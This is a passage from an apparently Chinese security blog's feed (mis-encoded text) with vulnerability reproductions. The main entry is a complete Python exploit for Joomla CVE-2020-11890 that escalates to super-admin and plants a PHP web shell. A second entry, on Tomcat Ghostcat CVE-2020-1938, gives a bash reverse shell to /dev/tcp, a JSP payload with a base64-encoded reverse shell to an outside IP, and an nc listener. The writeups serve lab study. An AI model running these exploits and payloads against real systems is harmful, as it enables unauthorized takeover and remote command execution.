href="https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent">https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent</a></p></li></ul></blockquote><blockquote><ul><li><p>é¶åœºè¯´æ˜å‚è€ƒï¼š</p><p><a href="https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/">https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/</a></p></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Moriarty-Corpé¶åœºä¸€æ—¥æ¸¸&quot;&gt;&lt;a href=&quot;#Moriarty-Corpé¶åœºä¸€æ—¥æ¸¸&quot; class=&quot;headerlink&quot; title=&quot;Moriarty Corpé¶åœºä¸€æ—¥æ¸¸&quot;&gt;&lt;/a&gt;Moriarty Corpé¶åœºä¸€æ—¥æ¸¸&lt;/h1&gt;&lt;h2 id=&quot;é¶</summary>
      
    
    
    
    <category term="é¶æœºå¤ç°" scheme="http://example.com/categories/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-11890æ¼æ´å¤ç°</title>
    <link href="http://example.com/2020/04/27/CVE-2020-11890%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2020/04/27/CVE-2020-11890%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-27T15:18:20.000Z</published>
    <updated>2021-09-28T09:49:05.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-11890æ¼æ´å¤ç°"><a href="#CVE-2020-11890æ¼æ´å¤ç°" class="headerlink" title="CVE-2020-11890æ¼æ´å¤ç°"></a>CVE-2020-11890æ¼æ´å¤ç°</h1><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><blockquote><p>Joomla!æ˜¯ç¾å›½Open Source Matterså›¢é˜Ÿçš„ä¸€å¥—ä½¿ç”¨PHPå’ŒMySQLå¼€å‘çš„å¼€æºã€è·¨å¹³å°çš„å†…å®¹ç®¡ç†ç³»ç»Ÿ(CMS)ã€‚ Joomla! 2.5.0ç‰ˆæœ¬è‡³3.9.16ç‰ˆæœ¬ä¸­å­˜åœ¨è®¿é—®æ§åˆ¶é”™è¯¯æ¼æ´ï¼Œè¯¥æ¼æ´æºäºä¸æ­£ç¡®çš„è¾“å…¥éªŒè¯ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ACLä¿æŠ¤</p></blockquote><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç¯å¢ƒï¼šdocker</p><p>åˆ©ç”¨dockeræ‹‰å–é•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull hoangkien1020/joomla:3.9.16</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427230457619.png" alt="image-20200427230457619"></p><p>å¯åŠ¨dockeræ¼æ´ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --rm -it -p 8080:80 hoangkien1020/joomla:3.9.16</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427230613515.png" alt="image-20200427230613515"></p><p>æ‰“å¼€æœ¬åœ°8080ç«¯å£</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427230742635.png" alt="image-20200427230742635"></p><p>è§‚å¯Ÿåˆ°ä»¥ä¸Šé¡µé¢è¯æ˜æ¼æ´ç¯å¢ƒè¿è¡ŒæˆåŠŸ</p><p>è¯¥æ¼æ´ç¯å¢ƒç›¸å…³å‚æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### MySQL: root: root (can access via IP:8080/phpmyadmin)</span><br><span class="line"></span><br><span class="line">### superadmin:1234 (Super Users)</span><br><span class="line"></span><br><span class="line">### admin:1234 (Administrator)</span><br><span class="line"></span><br><span class="line">### hacker:1234 (Manager) </span><br></pre></td></tr></table></figure><p>POCå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_token</span>(<span class="params">resp</span>):</span></span><br><span class="line">    match = re.search(<span class="string">r&#x27;name=&quot;([a-f0-9]&#123;32&#125;)&quot; value=&quot;1&quot;&#x27;</span>, resp.text, re.S)</span><br><span class="line">    <span class="keyword">if</span> match <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot find CSRF token!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_admin_login</span>(<span class="params">sess, url, uname, upass</span>):</span></span><br><span class="line">    admin_url = url + <span class="string">&#x27;/administrator/index.php&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Getting token for admin login&#x27;</span>)</span><br><span class="line">    resp = sess.get(admin_url, verify=<span class="literal">True</span>)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Logging in to admin&#x27;</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: uname,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: upass,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">        token: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(admin_url, data=data, verify=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;task=profile.edit&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Admin Login Failure!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Admin Login Successfully!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkAdmin</span>(<span class="params">url, sess</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Checking admin&quot;</span>)</span><br><span class="line">    url_check = url + <span class="string">&#x27;/administrator/index.php?option=com_users&amp;view=users&#x27;</span></span><br><span class="line">    resp = sess.get(url_check, verify=<span class="literal">True</span>)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] You are not administrator!&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSuperAdmin</span>(<span class="params">url, sess</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Checking Superadmin&quot;</span>)</span><br><span class="line">    url_check = url + <span class="string">&#x27;/administrator/index.php?option=com_config&#x27;</span></span><br><span class="line">    resp = sess.get(url_check, verify=<span class="literal">True</span>)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] You are not Super-Users!&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGroup</span>(<span class="params">url, sess, token</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Changing group&quot;</span>)</span><br><span class="line">    newdata = &#123;</span><br><span class="line">        <span class="string">&#x27;jform[title]&#x27;</span>: <span class="string">&#x27;Public&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[parent_id]&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;group.apply&#x27;</span>,</span><br><span class="line">        token: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    newdata[<span class="string">&#x27;task&#x27;</span>] = <span class="string">&#x27;group.apply&#x27;</span></span><br><span class="line">    resp = sess.post(url + <span class="string">&quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=1&quot;</span>, data=newdata,</span><br><span class="line">                     verify=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;jform[parent_id]&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Maybe failed to change group...&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Done!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_user</span>(<span class="params">url, sess, username, password, email, token</span>):</span></span><br><span class="line">    newdata = &#123;</span><br><span class="line">        <span class="comment"># Form data</span></span><br><span class="line">        <span class="string">&#x27;jform[name]&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;jform[username]&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;jform[password]&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;jform[password2]&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;jform[email]&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;jform[resetCount]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[sendEmail]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[block]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[requireReset]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[id]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[groups][]&#x27;</span>: <span class="number">8</span>,</span><br><span class="line">        token: <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    newdata[<span class="string">&#x27;task&#x27;</span>] = <span class="string">&#x27;user.apply&#x27;</span></span><br><span class="line">    url_post = url + <span class="string">&quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=0&quot;</span></span><br><span class="line">    sess.post(url_post, data=newdata, verify=<span class="literal">True</span>)</span><br><span class="line">    sess.get(url + <span class="string">&quot;/administrator/index.php?option=com_login&amp;task=logout&amp;&quot;</span> + token + <span class="string">&quot;=1&quot;</span>, verify=<span class="literal">True</span>)</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    <span class="keyword">if</span> try_admin_login(sess, url, username, password):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Now, you are super-admin!!!!!!!!!!!!!!!!&quot;</span> + <span class="string">&quot;\n[+] Your super-admin account: \n[+] USERNAME: &quot;</span> + username + <span class="string">&quot;\n[+] PASSWORD: &quot;</span> + password + <span class="string">&quot;\n[+] Done!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] Sorry,exploit fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGroupDefault</span>(<span class="params">url, sess, token</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Changing group&quot;</span>)</span><br><span class="line">    newdata = &#123;</span><br><span class="line">        <span class="string">&#x27;jform[title]&#x27;</span>: <span class="string">&#x27;Public&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[parent_id]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;group.apply&#x27;</span>,</span><br><span class="line">        token: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    newdata[<span class="string">&#x27;task&#x27;</span>] = <span class="string">&#x27;group.apply&#x27;</span></span><br><span class="line">    resp = sess.post(url + <span class="string">&quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=1&quot;</span>, data=newdata,</span><br><span class="line">                     verify=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;jform[parent_id]&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Maybe failed to change group...&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Done!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">sess, url, cmd, token</span>):</span></span><br><span class="line">    filename = <span class="string">&#x27;error.php&#x27;</span></span><br><span class="line">    shlink = url + <span class="string">&#x27;/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=506&amp;file=L2Vycm9yLnBocA%3D%3D&#x27;</span></span><br><span class="line">    shdata_up = &#123;</span><br><span class="line">        <span class="string">&#x27;jform[source]&#x27;</span>: <span class="string">&quot;&lt;?php echo &#x27;Hacked by HK\n&#x27; ;system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;template.apply&#x27;</span>,</span><br><span class="line">        token: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[extension_id]&#x27;</span>: <span class="string">&#x27;506&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[filename]&#x27;</span>: <span class="string">&#x27;/&#x27;</span> + filename</span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(shlink, data=shdata_up)</span><br><span class="line">    path2shell = <span class="string">&#x27;/templates/protostar/error.php?cmd=&#x27;</span> + cmd</span><br><span class="line">    <span class="comment"># print &#x27;[+] Shell is ready to use: &#x27; + str(path2shell)</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Checking:&#x27;</span></span><br><span class="line">    shreq = sess.get(url + path2shell)</span><br><span class="line">    shresp = shreq.text</span><br><span class="line">    <span class="built_in">print</span> shresp + <span class="string">&#x27;[+] Shell link: \n&#x27;</span> + (url + path2shell)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Module finished.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># Construct the argument parser</span></span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    <span class="comment"># Add the arguments to the parser</span></span><br><span class="line">    ap.add_argument(<span class="string">&quot;-url&quot;</span>, <span class="string">&quot;--url&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot; URL for your Joomla target&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--username&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-usuper&quot;</span>, <span class="string">&quot;--usernamesuper&quot;</span>, default=<span class="string">&quot;hk&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Super&#x27;s username&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-psuper&quot;</span>, <span class="string">&quot;--passwordsuper&quot;</span>, default=<span class="string">&quot;12345678&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Super&#x27;s password&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-esuper&quot;</span>, <span class="string">&quot;--emailsuper&quot;</span>, default=<span class="string">&quot;hk@hk.com&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Super&#x27;s Email&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-cmd&quot;</span>, <span class="string">&quot;--command&quot;</span>, default=<span class="string">&quot;whoami&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;command&quot;</span>)</span><br><span class="line">    args = <span class="built_in">vars</span>(ap.parse_args())</span><br><span class="line">    <span class="comment"># target</span></span><br><span class="line">    url = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Your target: &#x27;</span> + url</span><br><span class="line">    <span class="comment"># username</span></span><br><span class="line">    uname = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">    <span class="comment"># password</span></span><br><span class="line">    upass = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">    <span class="comment"># command</span></span><br><span class="line">    command = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;command&#x27;</span>]))</span><br><span class="line">    <span class="comment"># username of superadmin</span></span><br><span class="line">    usuper = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;usernamesuper&#x27;</span>]))</span><br><span class="line">    <span class="comment"># password of superadmin</span></span><br><span class="line">    psuper = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;passwordsuper&#x27;</span>]))</span><br><span class="line">    <span class="comment"># email of superadmin</span></span><br><span class="line">    esuper = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;emailsuper&#x27;</span>]))</span><br><span class="line">    <span class="comment"># session</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> try_admin_login(sess, url, uname, upass): sys.exit()</span><br><span class="line">    token = checkAdmin(url, sess)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> changeGroup(url, sess, token):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] Sorry,exploit fail!&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    sess = create_user(url, sess, usuper, psuper, esuper, token)</span><br><span class="line">    token = checkSuperAdmin(url, sess)</span><br><span class="line">    <span class="comment"># Now you are Super-admin</span></span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        <span class="comment"># call RCE</span></span><br><span class="line">        changeGroupDefault(url, sess, token)  <span class="comment"># easy to view :))</span></span><br><span class="line">        rce(sess, url, command, token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡ŒPOC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cve202011890.py -url http://localhost:8080 -u admin -p 1234</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427231343047.png"></p><p>è§‚å¯Ÿå¾—çŸ¥å·²ç”Ÿæˆwebshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427231451884.png" alt="image-20200427231451884"></p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><blockquote><p>æ¥æº:MISC</p><p>é“¾æ¥:<a href="https://developer.joomla.org/security-centre/810-20200402-core-missing-checks-for-the-root-usergroup-in-usergroup-table.html">https://developer.joomla.org/security-centre/810-20200402-core-missing-checks-for-the-root-usergroup-in-usergroup-table.html</a></p></blockquote><blockquote><p>æ¥æº:nvd.nist.gov</p><p>é“¾æ¥:<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11890">https://nvd.nist.gov/vuln/detail/CVE-2020-11890</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2020-11890æ¼æ´å¤ç°&quot;&gt;&lt;a href=&quot;#CVE-2020-11890æ¼æ´å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-11890æ¼æ´å¤ç°&quot;&gt;&lt;/a&gt;CVE-2020-11890æ¼æ´å¤ç°&lt;/h1&gt;&lt;h3 id=&quot;æ¼</summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Tomcatå¹½çµçŒ«æ¼æ´å¤ç°</title>
    <link href="http://example.com/2020/02/22/Tomcat-CVE-2020-1938%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2020/02/22/Tomcat-CVE-2020-1938%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-02-22T10:58:01.000Z</published>
    <updated>2021-09-28T09:51:14.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-CVE-2020-1938å¤ç°"><a href="#Tomcat-CVE-2020-1938å¤ç°" class="headerlink" title="Tomcat-CVE-2020-1938å¤ç°"></a>Tomcat-CVE-2020-1938å¤ç°</h1><p>[TOC]</p><h3 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h3><blockquote><p>Tomcatæ˜¯ç”±Apacheè½¯ä»¶åŸºé‡‘ä¼šå±ä¸‹Jakartaé¡¹ç›®å¼€å‘çš„Servletå®¹å™¨ï¼ŒæŒ‰ç…§Sun Microsystemsæä¾›çš„æŠ€æœ¯è§„èŒƒï¼Œå®ç°äº†å¯¹Servletå’ŒJavaServer Pageï¼ˆJSPï¼‰çš„æ”¯æŒï¼Œå¹¶æä¾›äº†ä½œä¸ºWebæœåŠ¡å™¨çš„ä¸€äº›ç‰¹æœ‰åŠŸèƒ½ï¼Œå¦‚Tomcatç®¡ç†å’Œæ§åˆ¶å¹³å°ã€å®‰å…¨å±€ç®¡ç†å’ŒTomcaté˜€ç­‰ã€‚ç”±äºTomcatæœ¬èº«ä¹Ÿå†…å«äº†HTTPæœåŠ¡å™¨ï¼Œå› æ­¤ä¹Ÿå¯ä»¥è§†ä½œå•ç‹¬çš„WebæœåŠ¡å™¨ã€‚</p></blockquote><blockquote><p>æ”»å‡»è€…é€šè¿‡Ajpåè®®ç«¯å£åˆ©ç”¨è¯¥æ¼æ´è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œå¦‚ï¼šwebapp é…ç½®æ–‡ä»¶ã€æºä»£ç ç­‰ã€‚</p></blockquote><h3 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬"></a>æ¼æ´å½±å“ç‰ˆæœ¬</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tomcat 6.*</span><br><span class="line">Tomcat 7.* &lt; 7.0.100</span><br><span class="line">Tomcat 8.* &lt; 8.5.51</span><br><span class="line">Tomcat 9.* &lt; 9.0.31</span><br></pre></td></tr></table></figure><h3 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h3><p>æœ¬æ¬¡æ¼æ´å¤ç°é‡‡ç”¨Docker<br>Tomcatç‰ˆæœ¬8.5.32</p><ol><li>ä¸‹è½½é•œåƒ</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search tomcat-8.5.32</span><br><span class="line">docker pull duonghuuphuc/tomcat-8.5.32</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823613269880.jpg"></p><ol><li>å¯åŠ¨é•œåƒ<br>``<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823644141674.jpg"></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker run -d -p 8080:8080 -p 8009:8009 --name ghostcat duonghuuphuc/tomcat-8.5.32</span><br><span class="line">docker port ghostcat</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç›¸å…³æ¼æ´åˆ©ç”¨è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/xindongzhuaizhuai/CVE-2020-1938</span><br><span class="line">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</span><br></pre></td></tr></table></figure><p><strong>æ–‡ä»¶è¯»å–</strong><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823650789821.jpg"><br><strong>æ–‡ä»¶åŒ…å«RCE</strong><br>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å®ç°RCEï¼Œæ”»å‡»éœ€è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œå³éœ€è¦å°†payloadæ–‡ä»¶ä¸Šä¼ åˆ°tomcatç›®å½•ä¸‹ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¿€æ´»payloadã€‚è¿™é‡Œä»¥åå¼¹shellä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/åå¼¹ip/åå¼¹ç«¯å£ 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ä¸ºäº†èƒ½æ­£å¸¸æ‰§è¡Œéœ€è¦å¯¹å‘½ä»¤è¿›è¡Œç¼–ç å¹¶ç»„è£…æˆbashï¼Œæ¨èåœ¨çº¿bash payloadç”Ÿæˆã€‚<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">bash payload</a><br>æœ€ç»ˆçš„payloadæ–‡ä»¶test.txtå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTkuMjkuMTg2Ljg5Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å¼€å¯ç›‘å¬<br>ä½¿ç”¨è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">python poc.py -p 8009 -f test.txt ç›®æ ‡ip</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823666041048.jpg"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823665764233.jpg"></p><h3 id="åŠ 